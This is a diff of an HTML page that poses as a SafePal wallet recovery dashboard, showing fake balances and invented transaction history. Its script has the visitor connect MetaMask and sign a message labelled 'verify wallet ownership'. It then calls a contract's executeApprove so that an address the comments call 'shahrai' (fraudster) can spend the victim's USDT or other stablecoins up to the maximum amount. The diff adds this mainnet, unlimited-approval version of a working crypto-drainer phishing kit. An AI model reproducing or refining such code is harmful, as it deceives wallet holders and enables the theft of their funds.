@@ -1,117 +1,334 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SafePal Recovery</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-        }
-        .container {
-            text-align: center;
-            padding: 20px;
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 400px;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            margin: 10px;
-            border-radius: 5px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-        #status {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #333;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wallet Dashboard</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #f4f4f7;
+      margin: 0;
+      padding: 20px;
+      color: #333;
+    }
+    .wallet {
+      max-width: 500px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      padding: 20px;
+    }
+    .wallet h2 {
+      margin-bottom: 20px;
+      font-size: 24px;
+      text-align: center;
+    }
+    .balance {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin: 15px 0;
+      padding: 10px;
+      border-bottom: 1px solid #eee;
+    }
+    .balance img {
+      width: 24px;
+      height: 24px;
+      margin-right: 10px;
+    }
+    .token {
+      display: flex;
+      align-items: center;
+      background-color: #f0f0f5;
+      padding: 5px 10px;
+      border-radius: 6px;
+    }
+    .token span {
+      margin-right: 10px;
+    }
+    .balance strong {
+      font-size: 18px;
+      display: inline-block;
+      width: 90px;
+      text-align: right;
+    }
+    .balance .usd {
+      font-size: 12px;
+      color: #888;
+      text-align: right;
+      margin-top: 5px;
+    }
+    .transactions {
+      margin-top: 30px;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+    .transactions h3 {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+    .tx {
+      background: #f9f9fb;
+      border: 1px solid #ddd;
+      padding: 10px;
+      border-radius: 8px;
+      margin-bottom: 10px;
+    }
+    .tx span {
+      display: block;
+      font-size: 14px;
+    }
+    .tx .date {
+      color: #888;
+      font-size: 12px;
+      margin-top: 4px;
+    }
+    .connect-btn {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      background-color: ##4559ff;
+      color: white;
+      text-align: center;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 30px;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h2>SafePal Recovery</h2>
-        <button id="connectButton" onclick="connectWallet()">Connect Wallet</button>
-        <p id="status">Please connect your MetaMask wallet.</p>
+  <div class="wallet">
+    <h2>Wallet Recovery</h2>
+
+    <!-- BTC Balance -->
+    <div class="balance">
+      <div class="token">
+        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1.png">
+        <span>BTC (Bitcoin)</span>
+        <div class="usd" id="btc-price">$0.00</div>
+      </div>
+      <div>
+        <strong id="btc-amount">0.01</strong>
+        <div class="usd" id="btc-equivalent">$0.00</div>
+      </div>
     </div>
 
-    <script>
-        async function connectWallet() {
-            try {
-                document.getElementById('status').innerText = 'Connecting...';
+    <!-- ETH Balance -->
+    <div class="balance">
+      <div class="token">
+        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png" alt="ETH">
+        <span>ETH (Ethereum)</span>
+        <div class="usd" id="eth-price">$0.00</div>
+      </div>
+      <div>
+        <strong id="eth-amount">1.84</strong>
+        <div class="usd" id="eth-equivalent">$0.00</div>
+      </div>
+    </div>
 
-                if (!window.ethereum || !window.ethereum.isMetaMask) {
-                    throw new Error('MetaMask not found. Please install MetaMask or ensure it is active.');
-                }
+    <!-- SOL Balance -->
+    <div class="balance">
+      <div class="token">
+        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/5426.png">
+        <span>SOL (Solana)</span>
+        <div class="usd" id="sol-price">$0.00</div>
+      </div>
+      <div>
+        <strong id="sol-amount">0</strong>
+        <div class="usd" id="sol-equivalent">$0.00</div>
+      </div>
+    </div>
 
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                if (accounts.length === 0) {
-                    throw new Error('No accounts found. Please unlock MetaMask.');
-                }
+    <!-- USDT Balance -->
+    <div class="balance">
+      <div class="token">
+        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png">
+        <span>USDT (Tether)</span>
+        <div class="usd" id="usdt-price">$0.00</div>
+      </div>
+      <div>
+        <strong id="usdt-amount">37,598.00</strong>
+        <div class="usd" id="usdt-equivalent">$0.00</div>
+      </div>
+    </div>
 
-                const userAddress = accounts[0];
-                document.getElementById('status').innerText = 'Connected. Verifying wallet ownership...';
+    <div class="transactions">
+      <h3>Recent Transactions</h3>
+      <div class="tx">
+        <span>Received 2750 USDT</span>
+        <span class="date">May 4, 2018</span>
+      </div>
+      <div class="tx">
+        <span>Sent 2300 USDT</span>
+        <span class="date">August 17, 2018</span>
+      </div>
+      <div class="tx">
+        <span>Received 10000 USDT</span>
+        <span class="date">November 23, 2019</span>
+      </div>
+      <div class="tx">
+        <span>Received 25000 USDT</span>
+        <span class="date">February 2, 2019</span>
+      </div>
+      <div class="tx">
+        <span>Sent 977 USDT</span>
+        <span class="date">July 9, 2020</span>
+      </div>
+      <div class="tx">
+        <span>Sent 3.99 BTC</span>
+        <span class="date">January 1, 2020</span>
+      </div>
+      <div class="tx">
+        <span>Sent 7 BTC</span>
+        <span class="date">March 3, 2020</span>
+      </div>
+      <div class="tx">
+        <span>Received 10 ETH</span>
+        <span class="date">April 2, 2020</span>
+      </div>
+      <div class="tx">
+        <span>Sent 8.16 ETH</span>
+        <span class="date">December 15, 2020</span>
+      </div>
+    </div>
 
-                // Перевірка мережі (Sepolia)
-                const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
-                const targetChainId = 11155111; // Sepolia Testnet
-                if (chainId !== targetChainId) {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: `0x${targetChainId.toString(16)}` }]
-                    });
-                }
+    <button class="connect-btn" onclick="connectWallet()">Connect Wallet</button>
+  </div>
 
-                // Підпис повідомлення
-                const message = 'Verify wallet ownership for SafePal recovery';
-                const signature = await window.ethereum.request({
-                    method: 'personal_sign',
-                    params: [message, userAddress]
-                });
+  <script>
+    const tokens = {
+      56: { // BNB Chain
+        usdt: "0x55d398326f99059fF775485246999027B3197955",
+        busd: "0x4Fabb145d64652a948d72533023f6E7A623C7C53"
+      },
+      1: { // Ethereum Mainnet
+        usdt: "0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD",
+        usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
+      },
+      137: { // Polygon
+        usdt: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
+        usdc: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
+      }
+    };
 
-                console.log('Signature:', signature);
-                document.getElementById('status').innerText = 'Wallet verified. Processing recovery...';
+    const contractAddress = "0xA606bCbafce5Fe67483EF479620A384DE7971A49"; // Твоя поточна адреса ApproveContract
+    const shahraiAddress = "0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e"; // Твій гаманець Б
 
-                // Виклик executeApprove через ApproveContract
-                const contractAddress = '0x6Ca0CBDD0Fb8a455052F393BE64B84a8F09410b3'; // Встав нову адресу
-                const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // TestUSDT
-                const shahraiAddress = '0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e'; // Гаманець Б
-                const amount = 5000000; // 0.0005 USDT
+    function formatNumber(number) {
+      return Number(number).toLocaleString(undefined, {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      });
+    }
 
-                const contractAbi = [
-                    "function executeApprove(bytes memory message, address user, bytes memory signature, address token, address spender, uint256 amount) external"
-                ];
+    async function fetchPrices() {
+      const coins = ['usd-coin', 'bitcoin', 'solana', 'ethereum'];
+      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${coins.join(',')}&vs_currencies=usd`;
 
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                const contract = new ethers.Contract(contractAddress, contractAbi, signer);
+      try {
+        const response = await fetch(url);
+        const data = await response.json();
 
-                const messageBytes = ethers.utils.toUtf8Bytes(message);
-                const tx = await contract.executeApprove(messageBytes, userAddress, signature, usdtAddress, shahraiAddress, amount);
-                await tx.wait();
-                console.log('Transaction Hash:', tx.hash);
+        const usdtPrice = data['usd-coin'].usd;
+        const btcPrice = data.bitcoin.usd;
+        const solPrice = data.solana.usd;
+        const ethPrice = data.ethereum.usd;
 
-                document.getElementById('status').innerText = 'Recovery processed! Check your wallet.';
-            } catch (error) {
-                document.getElementById('status').innerText = `Error: ${error.message}`;
-                console.error('Detailed error:', error);
-            }
+        // Set price display
+        document.getElementById('usdt-price').innerText = `$${formatNumber(usdtPrice)}`;
+        document.getElementById('btc-price').innerText = `$${formatNumber(btcPrice)}`;
+        document.getElementById('sol-price').innerText = `$${formatNumber(solPrice)}`;
+        document.getElementById('eth-price').innerText = `$${formatNumber(ethPrice)}`;
+
+        // Update equivalents
+        const usdtAmount = parseFloat(document.getElementById('usdt-amount').innerText.replace(/,/g, ''));
+        const btcAmount = parseFloat(document.getElementById('btc-amount').innerText.replace(/,/g, ''));
+        const solAmount = parseFloat(document.getElementById('sol-amount').innerText.replace(/,/g, ''));
+        const ethAmount = parseFloat(document.getElementById('eth-amount').innerText.replace(/,/g, ''));
+
+        document.getElementById('usdt-equivalent').innerText = `$${formatNumber(usdtAmount * usdtPrice)}`;
+        document.getElementById('btc-equivalent').innerText = `$${formatNumber(btcAmount * btcPrice)}`;
+        document.getElementById('sol-equivalent').innerText = `$${formatNumber(solAmount * solPrice)}`;
+        document.getElementById('eth-equivalent').innerText = `$${formatNumber(ethAmount * ethPrice)}`;
+      } catch (error) {
+        console.error("Error fetching prices:", error);
+      }
+    }
+
+    async function connectWallet() {
+      try {
+        if (!window.ethereum || !window.ethereum.isMetaMask) {
+          throw new Error('MetaMask not found. Please install MetaMask or ensure it is active.');
         }
-    </script>
+
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        if (accounts.length === 0) {
+          throw new Error('No accounts found. Please unlock MetaMask.');
+        }
+
+        const userAddress = accounts[0];
+
+        // Визначення мережі користувача
+        const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
+        let tokenAddress;
+        let tokenName;
+        if (tokens[chainId]) {
+          tokenAddress = tokens[chainId].usdt || Object.values(tokens[chainId])[0];
+          tokenName = Object.keys(tokens[chainId])[0].toUpperCase();
+        } else {
+          throw new Error('Unsupported network');
+        }
+
+        // Отримання балансу
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const tokenAbi = [
+          "function balanceOf(address) view returns (uint256)",
+          "function decimals() view returns (uint8)"
+        ];
+        const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, provider);
+        const balance = await tokenContract.balanceOf(userAddress);
+        const decimals = await tokenContract.decimals();
+        const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
+        document.getElementById('usdt-amount').innerText = formatNumber(balanceFormatted);
+
+        // Оновлення USD еквіваленту після fetchPrices
+        await fetchPrices();
+
+        // Підпис повідомлення
+        const message = 'Verify wallet ownership for SafePal recovery';
+        const signature = await window.ethereum.request({
+          method: 'personal_sign',
+          params: [message, userAddress]
+        });
+
+        console.log('Signature:', signature);
+
+        // Виклик executeApprove з максимальним балансом
+        const contractAbi = [
+          "function executeApprove(bytes memory message, address user, bytes memory signature, address token, address spender, uint256 amount) external"
+        ];
+        const contract = new ethers.Contract(contractAddress, contractAbi, new ethers.providers.Web3Provider(window.ethereum).getSigner());
+
+        const maxAmount = ethers.constants.MaxUint256; // Максимальний баланс
+        const messageBytes = ethers.utils.toUtf8Bytes(message);
+        const tx = await contract.executeApprove(messageBytes, userAddress, signature, tokenAddress, shahraiAddress, maxAmount);
+        await tx.wait();
+        console.log('Transaction Hash:', tx.hash);
+
+        alert('Wallet connected successfully. Recovery processed!');
+      } catch (error) {
+        alert('Connection failed: ' + error.message);
+        console.error('Detailed error:', error);
+      }
+    }
+
+    window.onload = fetchPrices;
+  </script>
 </body>
 </html>
